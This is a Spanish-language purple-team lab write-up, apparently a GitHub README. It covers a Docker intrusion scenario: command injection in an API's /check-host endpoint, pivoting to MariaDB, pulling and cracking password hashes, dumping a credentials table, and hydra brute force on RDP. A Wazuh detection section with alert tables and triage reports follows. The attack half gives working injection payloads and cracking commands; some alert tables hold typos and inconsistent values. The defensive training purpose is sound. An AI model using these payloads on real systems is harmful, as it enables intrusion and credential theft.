
<div align="center">

# 🛡️ Docker Intrusion & SOC Response: API, MariaDB and Lateral Movement , Active Response (IA)

### API exploitation – Compromised credentials – Attack detection

**`Wazuh`** `·` **`Kali Linux`** `·` **`Docker`** `·` **`Mittre At&ck`**

---

🔴 **Ataque** &nbsp;→&nbsp; 🔵 **Detección** &nbsp;→&nbsp; 🟢 **Respuesta**

</div>



## 📌 Objetivo

El objetivo de este caso es crear, analizar y responder  una intrusión de múltiples etapas dentro de una infraestructura basada en Docker, desde la perspectiva de Ataque-Detecion-Respuesta

El escenario parte de una API vulnerable desplegada sobre Docker en un servidor Ubuntu, utilizada como punto de acceso inicial. A partir de este acceso, la actividad progresa hacia la exploración del entorno Docker y el acceso a un contenedor MariaDB, donde se encuentra información relacionada con activos, usuarios y credenciales.

La obtención de credenciales permite continuar la cadena de ataque mediante técnicas de Credential Access, recuperación de credenciales y un posterior intento de Lateral Movement hacia otros sistemas de la infraestructura.

Durante el desarrollo del incidente, el SOC utiliza Wazuh para monitorear la actividad, generar alertas mediante reglas personalizadas, utilizar playbooks para responder ante incidentes, investigar los eventos y relacionar las distintas acciones con técnicas de MITRE ATT&CK.


## :triangular_ruler: Arquitectura

El laboratorio SOC cuenta con dos redes segmentadas, separando el entorno de ataque del entorno de monitoreo.

- Red de Laboratorio: contiene los endpoints y servicios donde se desarrolla el escenario de ataque. En esta etapa, Kali Linux actúa como atacante y Ubuntu Server como objetivo, alojando la API vulnerable, Docker y MariaDB.

- Red de Estudio / SOC: contiene la infraestructura utilizada para monitorear, analizar y responder a los eventos generados en la red de laboratorio, principalmente mediante Wazuh.
  
<div>
<img width="1800" height="803" alt="Diagrama Caso2#" src="https://github.com/user-attachments/assets/1df88b4b-85ba-48ab-9ae4-a9fb0cfd5a39" />
</div>

------

## Herramientas y Tecnologías

 ![Ubuntu](https://img.shields.io/badge/Ubuntu-Server-E95420?style=flat-square&logo=ubuntu&logoColor=white)

 ![Docker](https://img.shields.io/badge/Docker-Containerization-2496ED?style=flat-square&logo=docker&logoColor=white)

 ![Python](https://img.shields.io/badge/Python-API%20Development-3776AB?style=flat-square&logo=python&logoColor=white)

 ![MariaDB](https://img.shields.io/badge/MariaDB-Database-003545?style=flat-square&logo=mariadb&logoColor=white)

 ![Wazuh](https://img.shields.io/badge/Wazuh-SIEM%20%26%20Monitoring-3479A5?style=flat-square&logo=wazuh&logoColor=white)

 ![Wazuh](https://img.shields.io/badge/Wazuh-Custom%20Rules-3479A5?style=flat-square&logo=wazuh&logoColor=white)

 ![Wazuh](https://img.shields.io/badge/Wazuh-Playbooks-3479A5?style=flat-square&logo=wazuh&logoColor=white)

 ![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-Framework-FF0000?style=flat-square&logoColor=white)

 ![Kali Linux](https://img.shields.io/badge/Kali%20Linux-Red%20Team-557C94?style=flat-square&logo=kalilinux&logoColor=white)

 ![John](https://img.shields.io/badge/John%20the%20Ripper-Credential%20Cracking-FFD700?style=flat-square&logoColor=black)

 ![Hashcat](https://img.shields.io/badge/Hashcat-Credential%20Cracking-FFD700?style=flat-square&logoColor=black)


  ## :small_red_triangle_down: Escenario  Attaque 

Esta sección documenta la fase ofensiva del de este desde la perspectiva del atacante. Kali Linux actúa como origen del ataque contra la Red de Laboratorio, con el objetivo de vulnerar una API expuesta en Ubuntu Server, utilizarla como punto de pivote hacia el contenedor MariaDB, y obtener credenciales que permitan avanzar hacia el resto de la infraestructura.  


- ## API Exploitation & Initial Access

En esta fase parto de una API expuesta en Ubuntu Server, sin saber todavía qué hay detrás de ella. El primer objetivo es lograr ejecución de comandos sobre el servidor, y una vez conseguido eso, empiezo a reconocer el entorno de red para entender dónde estoy parado y qué otros servicios podrían estar corriendo cerca


### ✅ [1.1] — Reconocimiento del servicio — Puerto de la API   

Antes de meterme con la API en sí, hago un barrido de puertos sobre la red del laboratorio para entender qué superficie tengo disponible. Con nmap -sV 192.168.3.0/24 escaneo todo el segmento y encuentro dos puertos de interés: 8080 , 3389

```
nmap -sV 192.168.3.0/24 
```
<div>

  <img width="1013" height="682" alt="paso2scan" src="https://github.com/user-attachments/assets/ea4d50a8-3adb-4029-a4b1-2e2c6fb1fdbe" />


</div>

----

### ✅ [1.2] — Command Injection 

Con el puerto 8080 identificado, pruebo el endpoint /check-host, que recibe un parámetro hostname. Noto que no sanitiza la entrada, así que inyecto un comando separado por ;. El resultado confirma ejecución de comandos sobre el servidor. 

```
 curl -X POST [http://192.168.3.100:8080/check-host](http://192.168.3.100:8080/check-host) -H "Content-Type: application/json" -d '{"hostname":"8.8.8.8; whoami"}'
```


<div>

  <img width="1002" height="119" alt="paso 1 2" src="https://github.com/user-attachments/assets/bdbe3907-845d-4f9d-8d98-efe0b13ddada" />

</div> 


----

### ✅ [1.3] — Network Discovery 

Con ejecución de comandos confirmada, reutilizo el mismo canal para reconocer la red interna. Consulto la tabla de rutas del sistema y aparece un segmento 172.18.0.0/16 que no es el de la red del laboratorio — es la red interna de Docker, lo que me indica que hay contenedores corriendo detrás de la API.



```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; cat /proc/net/fib_trie"}'
```
<div>
  
<img width="994" height="264" alt="paso1 3" src="https://github.com/user-attachments/assets/57bc98a0-d059-4814-b5ba-fbcf548f5174" />

</div> 


----

### ✅ [1.4] — Host Discovery

Con la red interna identificada, escaneo el segmento para localizar hosts activos y detectar nuevos objetivos. Busco identificar qué sistemas están disponibles para continuar avanzando desde el punto comprometido. 


```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; ping -c 1 172.18.0.3"}'
```
<div>
  
<img width="1009" height="147" alt="paso 1 4" src="https://github.com/user-attachments/assets/c2b85393-9643-4d86-a7eb-0dda5d607dc0" />


</div>


---

### ✅ [1.5] — Service Discovery 

Con el host 172.18.0.3 identificado, verifico la disponibilidad del puerto 3306 para determinar si existe un servicio de base de datos accesible. La respuesta confirma que el servicio MariaDB está expuesto y permite continuar con la siguiente etapa del ataque.  


```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; nc -zv 172.18.0.3 3306"}'
```

<div>

<img width="1009" height="139" alt="paso 1 5" src="https://github.com/user-attachments/assets/b34603f0-433d-4c0e-8608-9b5780f053fd" />

  
</div>

----

### ✅ [1.6] — Database Access

Con MariaDB identificado en 172.18.0.3:3306, intento establecer una conexión directa desde el sistema comprometido. Ejecuto SELECT 1 para validar que la base de datos acepta la conexión y que puedo interactuar con ella.

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -e \"SELECT 1;\""}'
```

<div>

  <img width="1009" height="160" alt="pas 1 6" src="https://github.com/user-attachments/assets/b6d3b392-c13d-4040-b9f2-4dda6837fd26" />

</div>


*****

*Con la conexión a MariaDB confirmada, doy por finalizada la fase de Acceso Inicial. La API vulnerable permitió ejecutar comandos sobre el servidor y utilizarlo como punto de acceso hacia la red interna, donde pude identificar un host activo y acceder al servicio MariaDB.*

****



 - ## Database Discovery & Credential Access

Con el acceso a MariaDB confirmado, comienzo a enumerar la base de datos para identificar su estructura, usuarios y credenciales. El objetivo es obtener información sensible que permita ampliar el acceso y continuar avanzando sobre la infraestructura.

### ☑️ [2.1] — Conexión anónima + enumeración de usuarios 

Con la conexión a MariaDB confirmada, intento acceder sin especificar un usuario y consulto la tabla mysql.user. El objetivo es identificar las cuentas existentes en el servidor

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u \"\" -e \"SELECT user FROM mysql.user;\""}'
```

<div>

  <img width="1004" height="274" alt="mariadbpaso2 1" src="https://github.com/user-attachments/assets/56455771-f532-422b-a8f4-c1e0ada552bc" />

</div>


---

### ☑️  [2.2] — Acceso con TCFD

Con los usuarios identificados pruebo primero con el user TCFD identificado , intento autenticarme en MariaDB utilizando esta cuenta. Ejecuto una consulta de validación para comprobar si el usuario dispone de acceso efectivo al servicio

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u TCFD -e \"SELECT 1;\""}'
```

<div>
<img width="996" height="193" alt="paso2 2maria" src="https://github.com/user-attachments/assets/ea5fb4db-7479-4529-b85b-9bcc027a749a" />

</div>


---

### ☑️ [2.3] — Identificación del usuario actual

Con el acceso mediante TCFD confirmado, valido la identidad efectiva de la sesión utilizando CURRENT_USER(). El resultado confirma que la conexión se está ejecutando como TCFD@172.18.0.2, estableciendo el contexto de usuario desde el que continuaré la enumeración.

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u TCFD -e \"SELECT CURRENT_USER();\""}'
```

<div>

<img width="991" height="202" alt="paso2 3maria" src="https://github.com/user-attachments/assets/275cd7e4-1046-4f16-af9a-6fff46f55a33" />

  
</div>


---

### ☑️ [2.4] — Extracción del hash de labadmin 

Con la identidad de la sesión confirmada, consulto mysql.user para obtener el valor de authentication_string asociado a labadmin. El resultado expone el hash de autenticación almacenado por MariaDB, proporcionando material que puede utilizarse para una posterior etapa de análisis de credenciales.

```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u TCFD -e \"SELECT user, authentication_string FROM mysql.user WHERE user='\''labadmin'\'';\""}'
```

<div>
<img width="998" height="219" alt="paso2 4maria" src="https://github.com/user-attachments/assets/98c4efb5-71e6-4086-a4a0-a2661e37fff5" />

  
</div>


```text
labadmin
*A0F874BC7F54EE086FCE60A37CE7887D8B31086B
```

--- 

### ☑️ [2.5] — Cracking offline 

En esta etapa intento recuperar la contraseña a partir del hash, trabajando de forma offline sobre Kali. Utilizo John the Ripper con el diccionario rockyou.txt, que prueba diferentes contraseñas hasta encontrar una que genere el mismo hash.

```bash
echo "labadmin:*A0F874BC7F54EE086FCE60A37CE7887D8B31086B" > hash_labadmin.txt
```

Se ejecuta John the Ripper:

```bash
john hash_labadmin.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1
```
```text
user: labadmin 
Password: password123
```
<div>

  <img width="1002" height="318" alt="jonhtriper" src="https://github.com/user-attachments/assets/978db4b8-8639-4946-8e8f-6f0f1883ddf6" />

</div>


--- 

### ☑️ [2.6] — Autenticación con labadmin

Con la contraseña obtenida mediante el proceso de cracking offline, intento autenticarme en MariaDB utilizando la cuenta labadmin. Una vez autenticado, consulto las bases disponibles para validar los privilegios de acceso obtenidos y continuar con la enumeración.


```
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"SHOW DATABASES;\""}'
```

<div>
 <img width="994" height="135" alt="paso2 6maria" src="https://github.com/user-attachments/assets/61e10671-cb12-4cd3-a264-6fc5b0b0eb49" />
</div>


--- 

### ☑️ [2.7] — Enumeración de tablas 

Con corporate_assets identificada como objetivo, enumero sus tablas para conocer la estructura de la información almacenada y localizar aquellas que puedan contener datos relevantes. 

```bash
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"USE corporate_assets; SHOW TABLES;\""}'
```

<div>

  <img width="1014" height="130" alt="paso2 7maria" src="https://github.com/user-attachments/assets/a25d3404-e235-4c55-876b-b3a7a6e792a1" />

</div>


--- 

### ☑️ [2.8] — Enumeración de endpoints 

Con las tablas identificadas, consulto los registros de endpoints mediante SELECT *. El objetivo es obtener la información almacenada en esa tabla y analizar los equipos registrados en la base de datos.

```bash
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"USE corporate_assets; SELECT * FROM endpoints;\""}'
```

<div>

<img width="996" height="194" alt="paso2 8maria" src="https://github.com/user-attachments/assets/fdb16b1a-b6ba-461d-a43e-073b57f507f1" />

  
</div>



- mariadb-prod          Database    172.18.0.3           3306     active
- web-server            SSH         192.168.3.100        22       active
- **`windows-srv `**    Windows     192.168.3.10         3389     active



### ☑️ [2.9] — Exfiltración de credenciales

La consulta expone los registros almacenados en credentials, incluyendo usuarios y contraseñas asociadas a distintos servicios y equipos del laboratorio. Esta información amplía el alcance del acceso obtenido y proporciona credenciales que pueden ser utilizadas para intentar autenticación sobre otros endpoints de la infraestructura.

```bash
curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"USE corporate_assets; SELECT * FROM credentials;\""}'
```

<div>

  <img width="998" height="203" alt="paso2 9" src="https://github.com/user-attachments/assets/01623ae4-c3d7-4580-b96d-d545573ec938" />

</div> 

- dbadmin — DBLab-2026-01
- webadmin — WebLab-2026-02
- **`administrador`** — WinLab-2026-03
- svc_backup — BackupLab-2026-04
- backup_operator — BackupLab-2026-05
- fin_user — FinanceLab-2026-06

*****
*Esta fase permitió ampliar el acceso inicial obtenido sobre la infraestructura, pasando de un acceso al servicio MariaDB a disponer de información interna de la organización. La base de datos expuso información sobre sistemas, usuarios y credenciales almacenadas, permitiendo identificar relaciones entre los datos y los distintos endpoints del laboratorio.*

*Como resultado, se obtuvo una credencial asociada a un usuario con presencia en otro endpoint de la red, proporcionando información de autenticación que amplía el alcance del acceso conseguido y permite validar hasta dónde puede extenderse el compromiso dentro de la infraestructura.*


*****


##  Lateral Movement & Windows Access

Con la información obtenida en la operacion hacia Mariadb  —el endpoint windows-srv en 192.168.3.10:3389 y una credencial asociada a administrador— tengo ahora un objetivo concreto dentro de la infraestructura. En esta fase intento moverme lateralmente desde el entorno comprometido hacia Windows Server, aprovechando el servicio RDP que ya había identificado como abierto en el escaneo inicial. 

### ⏹️ [3.1] — Fuerza bruta contra RDP

Con el usuario administrador como objetivo conocido, intento autenticarme contra el servicio RDP de Windows Server mediante un ataque de fuerza bruta mediante diccionario, buscando validar si la contraseña es alcanzable. 

```bash
hydra -l Administrador -P midiccionario.txt rdp://192.168.3.10 -t 1 -V
```

<div>

<img width="1004" height="100" alt="fb-1" src="https://github.com/user-attachments/assets/a1bc0b8a-aa84-4e34-9fa9-3fcfd7c43f7f" />

</div>
<img width="1004" height="308" alt="fb-2" src="https://github.com/user-attachments/assets/4d98b488-9d8d-4ad8-898b-b782722ba755" />

<div>
  
</div>



******
📈  *El objetivo de esta sección fue demostrar cómo una única superficie expuesta puede convertirse en el punto de partida de un compromiso progresivo. Partí sin conocer la infraestructura detrás de la API y fui avanzando paso a paso: logré ejecución de comandos, reconocí la red interna, descubrí MariaDB, enumeré usuarios, extraje y crackeé credenciales, y finalmente identifiqué un nuevo objetivo dentro de la infraestructura hacia donde moverme lateralmente.*

*Lo importante no es solo que cada técnica funcionó, sino que ningún paso fue aislado — cada hallazgo alimentó el siguiente. Una API sin validación de entrada terminó exponiendo credenciales de Windows Server.*

*En la siguiente sección analizo esta misma cadena desde el lado defensivo: qué detectó Wazuh, qué reglas se dispararon y cómo respondió el sistema de forma automática ante el ataque*


******


## 🛡️ Detección — Monitoreo y Análisis de Alertas 

Durante el desarrollo del escenario de ataque, Wazuh estuvo monitoreando en tiempo real toda la actividad generada sobre la infraestructura. Cada técnica ejecutada desde Kali dejó una traza en los logs del sistema que el agente recopiló, procesó y envió al manager para su análisis.

En esta sección muestro cómo esa actividad fue detectada: las reglas personalizadas que escribí para identificar cada técnica, las alertas que se dispararon en el dashboard, y la correlación entre lo que hizo el atacante y lo que vio el SIEM. Todo mapeado contra MITRE ATT&CK.


Asumo los roles de SOC L1 y L2 para analizar las alertas generadas durante la actividad detectada en el laboratorio. El análisis comienza con el triage inicial de las alertas y continúa con una investigación más profunda, correlacionando eventos, evidencias y técnicas identificadas durante la actividad.

<div>

<img width="881" height="491" alt="platform-overview-cover" src="https://github.com/user-attachments/assets/cd77e218-beec-4cae-b9d8-db8b769d1a0f" />

</div>

------ 

El SOC L1, responsable de la monitorización y análisis inicial de las alertas, identificó en primera instancia un comportamiento compatible con Command Injection, que activó la regla 100310. Esta alerta permitió al L1 establecer el punto de entrada del incidente y orientar el análisis de la actividad posterior observada en la infraestructura.

A partir de la continuidad de la actividad detectada, se generaron nuevas alertas asociadas a Network Discovery (100311) y Host Discovery (100312), permitiendo al SOC L1 correlacionar la secuencia de eventos y obtener una visión más completa del comportamiento observado para obtener informacion y datos relevantes para el escalamiento .


<div align="center">
<img width="2557" height="912" alt="discovery 310-312" src="https://github.com/user-attachments/assets/65978028-42d9-43c1-aa7c-04ca57039bdf" />
</div>
<div align="center">
<img width="2559" height="913" alt="Discovery 310" src="https://github.com/user-attachments/assets/4ccee032-fb04-4eab-a585-25ece1ea27bb" />
</div>

<br>
<br>



## Rule 100310 

<br>

<div>
   <img width="2545" height="501" alt="regla 100310" src="https://github.com/user-attachments/assets/de8cec0c-f155-42ca-b6e4-fb2b8bca05a0" />
</div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:06:57 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.result | PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data. 64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=9.66 ms --- 8.8.8.8 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min| 
| data.source  |   infrastructure-status-api| 
| data.parameters.hostname | 8.8.8.8; whoami | 
| rule.level | 10|
| rule.mitre.id | T1059.004 | 
| rule.mitre.tactic | Execution |
 

<br>
<br>



## Rule 100311

<br>

<div>
<img width="2542" height="452" alt="regla 100311" src="https://github.com/user-attachments/assets/f1396495-8101-4c46-b08b-25605ce2ddec" />
</div>

| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:08:05 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.result |PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.075 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms| 
| data.source  |   infrastructure-status-api| 
| data.parameters.hostname | 127.0.0.1; cat /proc/net/fib_trie | 
| rule.level | 8|
| rule.mitre.id | T1016 | 
| rule.mitre.tactic | Discovery |


<br>
<br>



## Rule 100312

<br>

<div>
<img width="2523" height="213" alt="regla 100312" src="https://github.com/user-attachments/assets/54136e12-15a6-42cf-aa92-907eba6f1dae" />
</div>

| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:08:53 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent|
| rule.id |  | 
| rule.description |  | 
| rule.level | 8|
| rule.mitre.id | T1018 | 
| rule.mitre.tactic |   Discovery |
| data.result | PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.071 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms| 
| data.source  |   infrastructure-status-api| 
| data.parameters.hostname | 127.0.0.1; ping -c 1 172.18.0.3 | 



---------------------
<br>

## Informe 
Las tres alertas se validan como actividad maliciosa, no como falso positivo. El endpoint /check-host solo debería recibir un host para hacer un ping, y en ese campo llegan comandos del sistema que además se ejecutaron. Ningún uso normal de la aplicación produce eso.

Las alertas siguen una progresión lógica (ejecución, reconocimiento de la red, apunte a otro host interno), propia de un ataque en preparación. 

<br>

- La regla 100310 confirma ejecución de comandos, algo que un administrador legítimo no haría a través de /check-host.
- Las alertas 100311 y 100312 se disparan minutos después sobre el mismo agente, endpoint y parámetro, lo que descarta eventos aislados.
- El destino del último comando (172.18.0.3) es un host interno distinto del servidor comprometido, lo que indica intención de movimiento lateral.


 <br>
 
 La conclusion sobre este escenario es  actividad maliciosa confirmada ,no se trata de un falso positivo  y se procede a documentar y escalar al L2 

 



# Ticket / Escalacion 

                                                                            
-  [🎫 Tickets - Command Injection en /check-host con reconocimiento de red interna (Ubunt-Serv-Agent) ](https://github.com/Lucasjavier708/Purple-Team-Detection-Lab/blob/main/Docker%20Intrusion%20%26%20SOC%20Response%3A%20API%2C%20MariaDB%20%2CLateral%20Movement%20and%20Active%20Response(AI)/TICKETS.md)                 

----

<br>

Seguido a los intentos de Command Injection detectados anteriormente, y como continuación de la cadena de actividad observada, se identificaron nuevas alertas indicando que el atacante comenzó a utilizar el acceso obtenido sobre la API para explorar y pivotar hacia servicios internos. Las alertas generadas evidencian una progresión desde el reconocimiento de red hacia el acceso directo a una base de datos MariaDB ubicada en la red interna de contenedores Docker (172.18.0.0/16), confirmando que el compromiso inicial sobre la API fue utilizado como vector de movimiento hacia otros recursos de la infraestructura. 

<br> 

<div>
  <img width="2557" height="890" alt="discovery nuevo 402-404" src="https://github.com/user-attachments/assets/8883dfce-1eca-4b71-81f2-0658341cee66" />

</div>
<div> 

<img width="2556" height="912" alt="discovery nuevo 405" src="https://github.com/user-attachments/assets/c2a69846-bd07-49cd-bfe1-130efe07db1c" />

</div>
<div>
 <img width="2558" height="908" alt="discovery nuevo 406" src="https://github.com/user-attachments/assets/a7b14036-4ed1-48bb-a772-7a4ebfe4f7eb" />

</div>

<br>
<br>



## Rule 100402 

<br>

<div>
   <img width="2532" height="217" alt="402" src="https://github.com/user-attachments/assets/68751554-d8a6-4ed8-8737-0f4eae5fe31f" />
</div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:14:29 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.mariadb.user |root | 
| data.mariadb.host  |  127.18.0.2| 
| data.maradb.query | SELECT user FROM mysql.user | 
| rule.level | 8|
| rule.description | MAriadb -Enumeracion de usuarios del Sistema  | 
| rule.mitre.id | T1078 | 
| rule.mitre.tactic |  Discovery  |

<br>
<br>



## Rule 100403

<br>

<div>
  <img width="2546" height="276" alt="403" src="https://github.com/user-attachments/assets/986410ee-f1f4-49c9-9c2d-857098c6f8c9" />
</div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:14:29 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.naruadb.user |TCFD | 
| data.mariadb.host  |  127.18.0.2| 
| data.maradb.query | SELECT 1 | 
| rule.level | 8|
| rule.description | MAriadb -Accesos mediante credenciales validas detectado | 
| rule.mitre.id | T1078 | 
| rule.mitre.tactic | Defensive evasion/ Persistence / Initial Acces |
 
<br>
<br>



## Rule 100404

<br>

<div>
  <img width="2527" height="201" alt="404" src="https://github.com/user-attachments/assets/96e87540-fc72-4d97-8575-e517a87ed6ce" />

</div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:06:57 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.mariadb.user |TCFD| 
| data.mariadb.host | 127.18.0.2| 
| data.mariadb.query | SELEC_CURRENT_USER() | 
| rule.level | 8|
|ruel.descripcion | Mariadb-Identificacion del ususario actual detectada |
| rule.mitre.id | T1033 | 
| rule.mitre.tactic | Discovery |


<br>
<br>



## Rule 1003405 

<br>

 <div>
   <img width="2527" height="182" alt="405" src="https://github.com/user-attachments/assets/fe25e907-f878-437c-b306-e14abb312b9e" />

 </div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:19:29 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.mariadb.user | labadmin | 
| data.maria.host  | 127.18.0.2| 
| data.mariadb.query | SHOW DATABASES | 
| rule.level | 8|
| rule.description  |Mariadb-Enumeracion de estructura e informacion de infraestructura detectada |
| rule.mitre.id | T1213 | 
| rule.mitre.tactic | Collection |

<br>
<br>



## Rule 100406 

<br>

 <div>
<img width="2527" height="182" alt="406" src="https://github.com/user-attachments/assets/d4ed79c8-97b1-47bb-b332-09a9876917c0" />

 </div>
                                                      
| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:06:57 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.mariadb.user | kabadmin | 
| data.mariadb.host  |  corporate_assests | 
| data.maria.database | SELECT * FROM credentials | 
| rule.level | 12|
| rule.description | Mariadb- Acceso a informacion de credenciales detectada |  
| rule.mitre.id | T1213| 
| rule.mitre.tactic | Collectioin |
 
 
---------------------
<br>

## Informe 
Las secuencias de eventyos descarta cualquier actividad legitima por las siguietes razones: 

- Las consultas proveniente del host 127.18.0.2, que es el contenedor de la API comprometida en la Fase 1 - no es un acceso directo administrativos 
- El ususario TCFD no deberia tener actividad de enumeracion sobre mysql.user
- La progresion es lineal y deliberada: enumeracion -> acceso -> reconocimiento -> exfiltracion 
- La alerta 100406 confirma acceso a datos sensibles de la organizacion - credenciales de multiples sistemas 

 <br>
 
La conclusion sobre este escenario queda como un verdadero positivo confirmado . La cadena de actividad iniciada en el ataque anterior escala a un acceso y posible exfiltracion de credenciales. Se procede a escalar al L2 con ticcket de alta prioridad 

 



# Ticket / Escalacion 

                                                                            
-  [🎫 Tickets - Acceso y exfiltración de credenciales detectado sobre MariaDB) ](https://github.com/Lucasjavier708/Purple-Team-Detection-Lab/blob/main/Docker%20Intrusion%20%26%20SOC%20Response%3A%20API%2C%20MariaDB%20%2CLateral%20Movement%20and%20Active%20Response(AI)/TICKETS.md)                 

----

<br>


<div>
  
</div>

